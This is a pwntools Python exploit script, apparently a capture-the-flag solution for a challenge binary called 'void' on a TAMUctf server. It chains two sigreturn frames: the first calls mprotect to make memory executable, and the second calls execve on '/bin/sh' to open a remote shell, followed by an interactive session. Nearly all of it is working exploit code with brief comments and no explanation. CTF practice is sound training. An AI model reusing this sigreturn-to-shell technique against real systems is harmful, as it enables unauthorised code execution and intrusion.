from pwn import *

context.update(arch='amd64',os='linux')

syscall_ret = 0x401018
mov_rdi_0_syscall_ret = 0x40102e
elf = ELF("./void")
#sock = process(elf.path)
#sock = gdb.debug(elf.path)
sock = remote("tamuctf.com", 443, ssl=True, sni="void")

# sys_mprotect(rdi: start, rsi: len, rdx: prot)
mprotect_target_area = 0x400000
frame_mprotect = SigreturnFrame(kernel = 'amd64')
frame_mprotect.rax = constants.SYS_mprotect
frame_mprotect.rdi = mprotect_target_area
frame_mprotect.rsi = 0x2000
frame_mprotect.rdx = (constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)
frame_mprotect.rsp = next(elf.search(b'\x00\x10\x40\x00')) # pointer to main (0x400088)
frame_mprotect.rip = syscall_ret


payload = p64(elf.symbols['main'])
payload += p64(syscall_ret)
payload += bytes(frame_mprotect)

sock.send(payload)
input("[Press any key]")
sock.send(payload[8:8+(constants.SYS_rt_sigreturn)]) # payload[8:8+0xf]

# sys_execve(rdi: filename, rsi: argv, rdx: envp)
frame_execve = SigreturnFrame(kernel = 'amd64')
frame_execve.rax = constants.SYS_execve
frame_execve.rdi = 0x400198  # pointer to main (0x400088) + len(payload)
frame_execve.rsi = 0
frame_execve.rdx = 0
frame_execve.rip = syscall_ret

payload = p64(elf.symbols['main'])
payload += p64(syscall_ret)
payload += bytes(frame_execve)
payload += b'/bin/sh\x00'

input("[Press any key]")
sock.send(payload)
input("[Press any key]")
sock.send(payload[8:8+constants.SYS_rt_sigreturn]) # payload[8:8+0xf]

## sys_write(rdi: fd, rsi: buf, rdx: count)
#frame_write = SigreturnFrame(kernel = 'amd64')
#frame_write.rax = constants.SYS_write
#frame_write.rdi = constants.STDOUT_FILENO
#frame_write.rsi = 0x40019c
#frame_write.rdx = 0x30
#frame_write.rsp = 0x400018
#frame_write.rip = syscall_ret


sock.interactive()
